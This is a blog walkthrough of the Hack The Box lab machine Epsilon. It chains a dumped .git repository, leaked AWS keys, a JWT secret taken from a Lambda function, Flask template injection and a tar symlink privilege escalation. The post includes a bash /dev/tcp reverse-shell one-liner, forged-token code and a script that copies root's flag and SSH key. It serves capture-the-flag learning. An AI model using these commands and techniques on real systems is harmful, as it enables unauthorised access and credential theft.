---
layout: post
title:  "Hackthebox: Epsilon"
date:   2022-04-24 10:25:15 +0530
category: Hackthebox Writeups
logo: writeups/assets/images/htb_epsilon/machine_banner.png
image:
    src: ../../images/htb_epsilon/machine_banner.png
    alt: featured image
tags: hackthebox aws ssti tar
img_path: ../../images/htb_epsilon/
---
Epsilon from hackthebox is a easy to moderate box which starts with finding a .git folder which contains aws secret key. With that secret key, I found the secret phrase of jwt token in a aws lambda function which helped to authenticate as admin where admin can track orders or place orders. Order placing page has a ssti vulnerability which elevated to rce. Vertical privesc to root is about exploiting tar symlink.

## Nmap

```md
# Nmap 7.92 scan initiated Sat Apr 23 20:20:44 2022 as: nmap -p- -T4 -oN ports.nmap -v 10.10.11.134
Nmap scan report for 10.10.11.134
Host is up (0.073s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Apr 23 20:21:16 2022 -- 1 IP address (1 host up) scanned in 32.13 seconds
```

Only 3 ports open. 

```md
# Nmap 7.92 scan initiated Sat Apr 23 20:23:44 2022 as: nmap -p 22,80,5000 -sCV -oN epsilon.nmap 10.10.11.134
Nmap scan report for 10.10.11.134
Host is up (0.081s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 23 20:23:54 2022 -- 1 IP address (1 host up) scanned in 10.10 seconds
```

Detailed scan of port reveals 80 and 5000 both ports runs a webserver. Banner tells that a python webserver is running port 5000. Port 80 has a `.git` directory which shouldn't be openly accessible at all.

## Port 80

Upon opening the website in port 80 gives a 403 status code which means it is forbidden. Also `/.git` directory is forbidden. Though it says forbidden, it may be possible to dump contents of `/.git` using gitdumper.

```bash
┌──(root💀kali)-[~/HTB/epsilon]
└─# /opt/GitTools/Dumper/gitdumper.sh http://10.10.11.134/.git/ .                                                                                                 130 ⨯
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[...]
[+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca
[+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34
```

With all the contents of `/.git` is now downloaded I can analyze the logs to see what changes was done to tis repository using `git log` command.

```bash
──(root💀kali)-[~/HTB/epsilon]
└─# git log                                                      
commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -> master)
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module

```bash
┌──(root💀kali)-[~/HTB/epsilon]
└─# git show 7cf92a7a09e523c1c667d13847c9ba22464412f3
commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
new file mode 100644
index 0000000..fed7ab9
--- /dev/null
+++ b/track_api_CR_148.py
@@ -0,0 +1,36 @@
+import io
+import os
+from zipfile import ZipFile
+from boto3.session import Session
+
+
+session = Session(
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    region_name='us-east-1',
+    endpoint_url='http://cloud.epsilong.htb')
+aws_lambda = session.client('lambda')    
+
+
+def files_to_zip(path):
+    for root, dirs, files in os.walk(path):
+        for f in files:
+            full_path = os.path.join(root, f)
+            archive_name = full_path[len(path) + len(os.sep):]
+            yield full_path, archive_name
+
+
+def make_zip_file_bytes(path):
+    buf = io.BytesIO()
+    with ZipFile(buf, 'w') as z:
```

This has all the important information as aws secret key, secret key id, region and endpoint url which will help to enumerate more using aws cli. Here the endpoint url is written as `http://cloud.epsilong.htb` which is most probably a typo because latest commit message says `Fixed Typo`.

```md
aws_access_key_id='AQLA5M37BDN6FJP76TDC'
aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
region_name='us-east-1'
endpoint_url='http://cloud.epsilon.htb')
```

This shows that aws lambda is being used which is a platform which let's users to run code or any backend service without managing servers. This indicates that some kind of backend service is running using aws lambda. I will look into that but it is important to see what are the other commits.

```bash
┌──(root💀kali)-[~/HTB/epsilon]
└─# git show b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

diff --git a/server.py b/server.py
new file mode 100644
index 0000000..dfdfa17
--- /dev/null
+++ b/server.py
@@ -0,0 +1,65 @@
+#!/usr/bin/python3
+
+import jwt
+from flask import *
+
+app = Flask(__name__)
+secret = '<secret_key>'
+
+def verify_jwt(token,key):
+       try:
+               username=jwt.decode(token,key,algorithms=['HS256',])['username']
+               if username:
+                       return True
+               else:
+                       return False
+       except:
+               return False
+
+@app.route("/", methods=["GET","POST"])
+def index():
+       if request.method=="POST":
+               if request.form['username']=="admin" and request.form['password']=="admin":
+                       res = make_response()
+                       username=request.form['username']
+                       token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
```

A `server.py` was also added in this commit though whole script is not available. Git exctractor is a great tool to extract all the files from `.git`.

```bash
┌──(root💀kali)-[~/HTB/epsilon]
└─# /opt/GitTools/Extractor/extractor.sh . extracted                                                                                                                 1 ⨯
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 5c52105750831385d4756111e1103957ac599d02
[+] Found file: /root/HTB/epsilon/extracted/0-5c52105750831385d4756111e1103957ac599d02/track_api_CR_148.py
[+] Found commit: b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
[+] Found file: /root/HTB/epsilon/extracted/1-b10dd06d56ac760efbbb5d254ea43bf9beb56d2d/server.py
[+] Found file: /root/HTB/epsilon/extracted/1-b10dd06d56ac760efbbb5d254ea43bf9beb56d2d/track_api_CR_148.py
[+] Found commit: c622771686bd74c16ece91193d29f85b5f9ffa91
[+] Found file: /root/HTB/epsilon/extracted/2-c622771686bd74c16ece91193d29f85b5f9ffa91/server.py
[+] Found file: /root/HTB/epsilon/extracted/2-c622771686bd74c16ece91193d29f85b5f9ffa91/track_api_CR_148.py
[+] Found commit: ce401ccecf421ff19bf43fafe8a60a0d0f0682d0
[+] Found file: /root/HTB/epsilon/extracted/3-ce401ccecf421ff19bf43fafe8a60a0d0f0682d0/track_api_CR_148.py
[+] Found commit: 7cf92a7a09e523c1c667d13847c9ba22464412f3
[+] Found file: /root/HTB/epsilon/extracted/4-7cf92a7a09e523c1c667d13847c9ba22464412f3/track_api_CR_148.py
[+] Found commit: c51441640fd25e9fba42725147595b5918eba0f1
[+] Found file: /root/HTB/epsilon/extracted/5-c51441640fd25e9fba42725147595b5918eba0f1/track_api_CR_148.py
```

There is a `server.py` among the extracted contents.

```python
#!/usr/bin/python3

import jwt
from flask import *

app = Flask(__name__)
secret = '<secret_key>'

def verify_jwt(token,key):
    try:
        username=jwt.decode(token,key,algorithms=['HS256',])['username']
        if username:
			return True
		else:
			return False
	except:
		return False

@app.route("/", methods=["GET","POST"])
def index():
	if request.method=="POST":
		if request.form['username']=="admin" and request.form['password']=="admin":
			res = make_response()
			username=request.form['username']
			token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
			res.set_cookie("auth",token)
			res.headers['location']='/home'
			return res,302
		else:
			return render_template('index.html')
	else:
		return render_template('index.html')

@app.route("/home")
def home():
	if verify_jwt(request.cookies.get('auth'),secret):
		return render_template('home.html')
	else:
		return redirect('/',code=302)

@app.route("/track",methods=["GET","POST"])
def track():
	if request.method=="POST":
		if verify_jwt(request.cookies.get('auth'),secret):
			return render_template('track.html',message=True)
		else:
			return redirect('/',code=302)
	else:
		return render_template('track.html')

@app.route('/order',methods=["GET","POST"])
def order():
	if verify_jwt(request.cookies.get('auth'),secret):
		if request.method=="POST":
			costume=request.form["costume"]
			message = '''
			Your order of "{}" has been placed successfully.
			'''.format(costume)
			tmpl=render_template_string(message,costume=costume)
			return render_template('order.html',message=tmpl)
		else:
			return render_template('order.html')
	else:
		return redirect('/',code=302)
app.run(debug='true')
```

Here the secret key is hidden but there is potential username and password most likely for the server running on port 5000.
```python
if request.form['username']=="admin" and request.form['password']=="admin":
```

## Port 5000

![index](500front.png)
A python webserver is running on port 5000. The index page has a form to login. But the username and password from `server.py` does not work. The `server.py` has part of code that encodes the jwt token for admin. And that token is later verified to authenticate as admin. But to encode a token for admin, the secret key must be known. While I enumerate more about the secret key let's start some directory bruteforcing.

## AWS Enum

There is a aws endpoint that is already discovered. The endpoint is not accessible from browser because it is not a webserver. To access the endpoint I used aws cli. But to use aws cli to access that particular endpoint some credentials must be supplied. I have already discoverd aws secret access keys and and access key code and region. Credentials can be supplied using `aws configure` command. After configuration of aws I looked at lambda functions which are running.

```bash
┌──(root💀kali)-[~/HTB/epsilon]
└─# aws --endpoint-url=http://cloud.epsilon.htb lambda list-functions                                                                                              130 ⨯
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2022-04-24T15:20:27.145+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "1a3a5236-d2e8-4e8e-857d-bc472a1cc2e0",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

`costume_shop_v1` is the function which is running.

```bash
┌──(root💀kali)-[~/HTB/epsilon]
└─# aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name=costume_shop_v1 | jq                            
{
  "Configuration": {
    "FunctionName": "costume_shop_v1",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
    "Runtime": "python3.7",
    "Role": "arn:aws:iam::123456789012:role/service-role/dev",
    "Handler": "my-function.handler",
    "CodeSize": 478,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2022-04-24T15:20:27.145+0000",
    "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
      "Mode": "PassThrough"
    },
    "RevisionId": "1a3a5236-d2e8-4e8e-857d-bc472a1cc2e0",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
  },
  "Code": {
    "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
  },
  "Tags": {}
}
```

Here is the location of the code of the function. Clicking on the link downloads a zip archive `lambda_archive.zip`. There is python script inside the archive called `lambda_function.py`

```python
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
```

And here is the secret for jwt.

```python
secret='RrXCv`mrNe!K!4+5`wYq'
```

## User Shell

Let's make a cookie for admin with the secret.

```bash
┌──(root💀kali)-[~/HTB/epsilon]
└─# python                  
Python 3.9.11 (main, Mar 17 2022, 07:20:01) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> secret = """RrXCv`mrNe!K!4+5`wYq"""
>>> token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
>>> token
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'
```

I added this token as auth and refreshed the page and jackpot, here is the admin panel.

![admin](admin.png)

As this is a flask web server there is always possibility of ssti so I looked at server source code in `server.py`.

```python
@app.route('/order',methods=["GET","POST"])
def order():
	if verify_jwt(request.cookies.get('auth'),secret):
		if request.method=="POST":
			costume=request.form["costume"]
			message = '''
			Your order of "{}" has been placed successfully.
			'''.format(costume)
			tmpl=render_template_string(message,costume=costume)
			return render_template('order.html',message=tmpl)
		else:
			return render_template('order.html')
	else:
		return redirect('/',code=302)
```

What this code is doing is first it verifies the jwt and then takes data supplied to `costume` parameter in the order form and later renders a template with that data. That is potentially a ssti vulnerability in the `costume` parameter. from browser it is not possible to test so I intercepted the request to burp and sent it to repeater and `costume` parameter is vulnerable to ssti.

![ssti](ssti.png)

### Exploiting ssti to shell

![rce](rce.png)

This test shows rce is possible so let's get a shell. It is not possible to get a shell with `bash -i >& /dev/tcp/10.10.14.7/1234 0>&1` because of bad characters so I encoded in base64 and then passed it as payload. And the shell opened.

![tom](tom.png)

## Privilege Escalation

Before starting use any kind of scripts I always look around for backups, logs etc. I found a `web_backups` directory in `/var/backups`. There was a tar file in it. After extracting the tar I found there is another tar archive and a sha1 checksum file. After extracting the archive I found it is the server's backup which is running on port 5000. In `app.py` I found a password but it didn't work for any of the users. So I started to question how these backups are created. So I ran pspy64 to look at the processes and I found a script called `backup.sh` is running every minute.

```bash
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```

The script does the following things:

1. Sets the file name at current date in nanoseconds format.
2. Deletes everything in /opt/backups/.
3. Creates a tar archive of `/var/www/app/`.
4. Generates `sha1sum` of the archive and saves into `/opt/backup` as checksum.
5. Generates a new file name again.
6. Again creates a tar archive of the checksum file and previously created tar archive. But this time does it with `-h` flag set. The `-h` flag archives files including the symbolic links.  Which means the the files which those links points to will also be archived. This is the privilege escalation vector.

So that mean if I can create a symlink then the script will archive that file too which my symlink points to. And when I extract the archive, I will get the original file. So In the next step I created a over dramatic script to automate this.

```bash
#!/bin/bash

rm -rf /dev/shm/tars/*
if [[ -f /opt/backups/checksum ]] #checks if checksum exists. Important because the directory is emptied every time the backup.sh executes
then
	echo "Checksum Exists"
	ln -sf /root/root.txt /opt/backups/checksum # creates symlink to root.txt
	echo "Symlink created"
	sleep 0.5
	cp /var/backups/web_backups/* /dev/shm/tars/. 2>/dev/null 
	for i in $(ls /dev/shm/tars/); do
		tar -xf /dev/shm/tars/$i -C /dev/shm/extracted
		length=$(cat /dev/shm/extracted/opt/backups/checksum | cut -d ' ' -f1 | wc -c) # Measures length of sha1sum. Though it should be 40, length here is 41 because of trailing newline character.
		if [[ $length -ne 41 ]]; then # if length not equal 41
			cp /dev/shm/extracted/opt/backups/checksum /home/tom/root.txt
			echo "root.txt copied into /home/tom"
		fi
		rm -r /dev/shm/extracted/*
	done

fi
```

And let it ran in a infinite loop.

![root.txt](root_txt.png)

Also ssh private key of root can be read using the script. So I decided to go for a full root access. I changed the symlink destination to `/root/.ssh/id_rsa`. After few seconds private key of root was copied into tom's home folder.

![id_rsa](id_rsa.png)

I copied it into my machine and logged in as root .

![root_shell](root_shell.png)